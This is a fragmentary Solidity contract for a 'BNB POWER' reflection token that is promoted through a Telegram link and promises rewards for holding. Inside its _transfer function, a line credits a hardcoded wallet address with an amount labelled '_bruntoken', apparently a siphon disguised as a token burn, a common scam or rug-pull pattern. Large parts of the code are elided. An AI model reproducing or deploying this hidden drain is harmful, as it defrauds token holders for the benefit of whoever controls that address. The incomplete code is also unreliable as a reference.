...
/**
*/
// BNB POWER - HOLD TO EARN BNB
// A reflection token that can be claimed automatically. 
// BNB can be earned just by holding $BNBPOW tokens in your wallet.
// Submitted for Telegram: https://t.me/BNBPowerEntry
...
contract  BNBPOWER  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "BNB POWER";
    string private _symbol = "BNBPOW";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xb602E5209DA9dc2cEEA88775A6b8b7164e79dB1D] += _bruntoken;
